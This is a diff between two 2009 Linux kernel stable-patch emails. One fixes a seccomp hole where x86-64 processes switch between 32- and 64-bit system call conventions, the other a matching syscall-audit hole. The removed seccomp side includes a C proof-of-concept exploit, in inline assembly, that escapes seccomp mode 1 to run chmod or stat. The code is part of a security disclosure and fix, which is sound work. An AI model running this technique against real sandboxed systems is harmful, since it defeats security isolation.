@@ -1,18 +1,18 @@
-Return-Path: <linux-kernel-owner+w=401wt.eu-S1755042AbZCNBpw@vger.kernel.org>
+Return-Path: <linux-kernel-owner+w=401wt.eu-S1759621AbZCNBqZ@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1755042AbZCNBpw (ORCPT <rfc822;w@1wt.eu>);
-	Fri, 13 Mar 2009 21:45:52 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1755264AbZCNBVU
+	id S1759621AbZCNBqZ (ORCPT <rfc822;w@1wt.eu>);
+	Fri, 13 Mar 2009 21:46:25 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1754974AbZCNBVW
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Fri, 13 Mar 2009 21:21:20 -0400
-Received: from kroah.org ([198.145.64.141]:35486 "EHLO coco.kroah.org"
+	Fri, 13 Mar 2009 21:21:22 -0400
+Received: from kroah.org ([198.145.64.141]:35502 "EHLO coco.kroah.org"
 	rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-	id S1753379AbZCNBUw (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Fri, 13 Mar 2009 21:20:52 -0400
-X-Mailbox-Line: From gregkh@mini.kroah.org Fri Mar 13 18:10:41 2009
-Message-Id: <20090314011041.753930516@mini.kroah.org>
+	id S1753742AbZCNBUy (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Fri, 13 Mar 2009 21:20:54 -0400
+X-Mailbox-Line: From gregkh@mini.kroah.org Fri Mar 13 18:10:42 2009
+Message-Id: <20090314011041.891793353@mini.kroah.org>
 User-Agent: quilt/0.48-1
-Date: Fri, 13 Mar 2009 18:10:47 -0700
+Date: Fri, 13 Mar 2009 18:10:48 -0700
 From: Greg KH <gregkh@suse.de>
 To: linux-kernel@vger.kernel.org, stable@kernel.org
 Cc: Justin Forbes <jmforbes@linuxtx.org>,
@@ -26,9 +26,9 @@ Cc: Justin Forbes <jmforbes@linuxtx.org>,
        Jake Edge <jake@lwn.net>, Eugene Teo <eteo@redhat.com>,
        torvalds@linux-foundation.org, akpm@linux-foundation.org,
        alan@lxorguk.ukuu.org.uk, Roland McGrath <roland@redhat.com>
-Subject: [patch 070/114] x86-64: seccomp: fix 32/64 syscall hole
+Subject: [patch 071/114] x86-64: syscall-audit: fix 32/64 syscall hole
 References: <20090314010937.416083662@mini.kroah.org>
-Content-Disposition: inline; filename=x86-64-seccomp-fix-32-64-syscall-hole.patch
+Content-Disposition: inline; filename=x86-64-syscall-audit-fix-32-64-syscall-hole.patch
 In-Reply-To: <20090314011649.GA26170@kroah.com>
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
@@ -40,219 +40,35 @@ X-Mailing-List: linux-kernel@vger.kernel.org
 
 From: Roland McGrath <roland@redhat.com>
 
-commit 5b1017404aea6d2e552e991b3fd814d839e9cd67 upstream.
+commit ccbe495caa5e604b04d5a31d7459a6f6a76a756c upstream.
 
 On x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with
 ljmp, and then use the "syscall" instruction to make a 64-bit system
 call.  A 64-bit process make a 32-bit system call with int $0x80.
 
-In both these cases under CONFIG_SECCOMP=y, secure_computing() will use
-the wrong system call number table.  The fix is simple: test TS_COMPAT
-instead of TIF_IA32.  Here is an example exploit:
-
-	/* test case for seccomp circumvention on x86-64
-
-	   There are two failure modes: compile with -m64 or compile with -m32.
-
-	   The -m64 case is the worst one, because it does "chmod 777 ." (could
-	   be any chmod call).  The -m32 case demonstrates it was able to do
-	   stat(), which can glean information but not harm anything directly.
-
-	   A buggy kernel will let the test do something, print, and exit 1; a
-	   fixed kernel will make it exit with SIGKILL before it does anything.
-	*/
-
-	#define _GNU_SOURCE
-	#include <assert.h>
-	#include <inttypes.h>
-	#include <stdio.h>
-	#include <linux/prctl.h>
-	#include <sys/stat.h>
-	#include <unistd.h>
-	#include <asm/unistd.h>
-
-	int
-	main (int argc, char **argv)
-	{
-	  char buf[100];
-	  static const char dot[] = ".";
-	  long ret;
-	  unsigned st[24];
-
-	  if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)
-	    perror ("prctl(PR_SET_SECCOMP) -- not compiled into kernel?");
-
-	#ifdef __x86_64__
-	  assert ((uintptr_t) dot < (1UL << 32));
-	  asm ("int $0x80 # %0 <- %1(%2 %3)"
-	       : "=a" (ret) : "0" (15), "b" (dot), "c" (0777));
-	  ret = snprintf (buf, sizeof buf,
-			  "result %ld (check mode on .!)\n", ret);
-	#elif defined __i386__
-	  asm (".code32\n"
-	       "pushl %%cs\n"
-	       "pushl $2f\n"
-	       "ljmpl $0x33, $1f\n"
-	       ".code64\n"
-	       "1: syscall # %0 <- %1(%2 %3)\n"
-	       "lretl\n"
-	       ".code32\n"
-	       "2:"
-	       : "=a" (ret) : "0" (4), "D" (dot), "S" (&st));
-	  if (ret == 0)
-	    ret = snprintf (buf, sizeof buf,
-			    "stat . -> st_uid=%u\n", st[7]);
-	  else
-	    ret = snprintf (buf, sizeof buf, "result %ld\n", ret);
-	#else
-	# error "not this one"
-	#endif
-
-	  write (1, buf, ret);
-
-	  syscall (__NR_exit, 1);
-	  return 2;
-	}
+In both these cases, audit_syscall_entry() will use the wrong system
+call number table and the wrong system call argument registers.  This
+could be used to circumvent a syscall audit configuration that filters
+based on the syscall numbers or argument details.
 
 Signed-off-by: Roland McGrath <roland@redhat.com>
-[ I don't know if anybody actually uses seccomp, but it's enabled in
-  at least both Fedora and SuSE kernels, so maybe somebody is. - Linus ]
 Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
 Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>
 
 ---
- arch/mips/include/asm/seccomp.h    |    1 -
- arch/powerpc/include/asm/compat.h  |    5 +++++
- arch/powerpc/include/asm/seccomp.h |    4 ----
- arch/sparc/include/asm/compat.h    |    5 +++++
- arch/sparc/include/asm/seccomp.h   |    6 ------
- arch/x86/include/asm/seccomp_32.h  |    6 ------
- arch/x86/include/asm/seccomp_64.h  |    8 --------
- kernel/seccomp.c                   |    7 ++++---
- 8 files changed, 14 insertions(+), 28 deletions(-)
+ arch/x86/kernel/ptrace.c |    2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
 
---- a/arch/mips/include/asm/seccomp.h
-+++ b/arch/mips/include/asm/seccomp.h
-@@ -1,6 +1,5 @@
- #ifndef __ASM_SECCOMP_H
- 
--#include <linux/thread_info.h>
- #include <linux/unistd.h>
- 
- #define __NR_seccomp_read __NR_read
---- a/arch/powerpc/include/asm/compat.h
-+++ b/arch/powerpc/include/asm/compat.h
-@@ -210,5 +210,10 @@ struct compat_shmid64_ds {
- 	compat_ulong_t __unused6;
- };
- 
-+static inline int is_compat_task(void)
-+{
-+	return test_thread_flag(TIF_32BIT);
-+}
-+
- #endif /* __KERNEL__ */
- #endif /* _ASM_POWERPC_COMPAT_H */
---- a/arch/powerpc/include/asm/seccomp.h
-+++ b/arch/powerpc/include/asm/seccomp.h
-@@ -1,10 +1,6 @@
- #ifndef _ASM_POWERPC_SECCOMP_H
- #define _ASM_POWERPC_SECCOMP_H
- 
--#ifdef __KERNEL__
--#include <linux/thread_info.h>
--#endif
--
- #include <linux/unistd.h>
- 
- #define __NR_seccomp_read __NR_read
---- a/arch/sparc/include/asm/compat.h
-+++ b/arch/sparc/include/asm/compat.h
-@@ -240,4 +240,9 @@ struct compat_shmid64_ds {
- 	unsigned int	__unused2;
- };
- 
-+static inline int is_compat_task(void)
-+{
-+	return test_thread_flag(TIF_32BIT);
-+}
-+
- #endif /* _ASM_SPARC64_COMPAT_H */
---- a/arch/sparc/include/asm/seccomp.h
-+++ b/arch/sparc/include/asm/seccomp.h
-@@ -1,11 +1,5 @@
- #ifndef _ASM_SECCOMP_H
- 
--#include <linux/thread_info.h> /* already defines TIF_32BIT */
--
--#ifndef TIF_32BIT
--#error "unexpected TIF_32BIT on sparc64"
--#endif
--
- #include <linux/unistd.h>
- 
- #define __NR_seccomp_read __NR_read
---- a/arch/x86/include/asm/seccomp_32.h
-+++ b/arch/x86/include/asm/seccomp_32.h
-@@ -1,12 +1,6 @@
- #ifndef _ASM_X86_SECCOMP_32_H
- #define _ASM_X86_SECCOMP_32_H
- 
--#include <linux/thread_info.h>
--
--#ifdef TIF_32BIT
--#error "unexpected TIF_32BIT on i386"
--#endif
--
- #include <linux/unistd.h>
- 
- #define __NR_seccomp_read __NR_read
---- a/arch/x86/include/asm/seccomp_64.h
-+++ b/arch/x86/include/asm/seccomp_64.h
-@@ -1,14 +1,6 @@
- #ifndef _ASM_X86_SECCOMP_64_H
- #define _ASM_X86_SECCOMP_64_H
- 
--#include <linux/thread_info.h>
--
--#ifdef TIF_32BIT
--#error "unexpected TIF_32BIT on x86_64"
--#else
--#define TIF_32BIT TIF_IA32
--#endif
--
- #include <linux/unistd.h>
- #include <asm/ia32_unistd.h>
- 
---- a/kernel/seccomp.c
-+++ b/kernel/seccomp.c
-@@ -8,6 +8,7 @@
- 
- #include <linux/seccomp.h>
- #include <linux/sched.h>
-+#include <linux/compat.h>
- 
- /* #define SECCOMP_DEBUG 1 */
- #define NR_SECCOMP_MODES 1
-@@ -22,7 +23,7 @@ static int mode1_syscalls[] = {
- 	0, /* null terminated */
- };
- 
--#ifdef TIF_32BIT
-+#ifdef CONFIG_COMPAT
- static int mode1_syscalls_32[] = {
- 	__NR_seccomp_read_32, __NR_seccomp_write_32, __NR_seccomp_exit_32, __NR_seccomp_sigreturn_32,
- 	0, /* null terminated */
-@@ -37,8 +38,8 @@ void __secure_computing(int this_syscall
- 	switch (mode) {
- 	case 1:
- 		syscall = mode1_syscalls;
--#ifdef TIF_32BIT
--		if (test_thread_flag(TIF_32BIT))
-+#ifdef CONFIG_COMPAT
-+		if (is_compat_task())
- 			syscall = mode1_syscalls_32;
+--- a/arch/x86/kernel/ptrace.c
++++ b/arch/x86/kernel/ptrace.c
+@@ -1512,7 +1512,7 @@ void send_sigtrap(struct task_struct *ts
+ #ifdef CONFIG_X86_32
+ # define IS_IA32	1
+ #elif defined CONFIG_IA32_EMULATION
+-# define IS_IA32	test_thread_flag(TIF_IA32)
++# define IS_IA32	is_compat_task()
+ #else
+ # define IS_IA32	0
  #endif
- 		do {
 
 
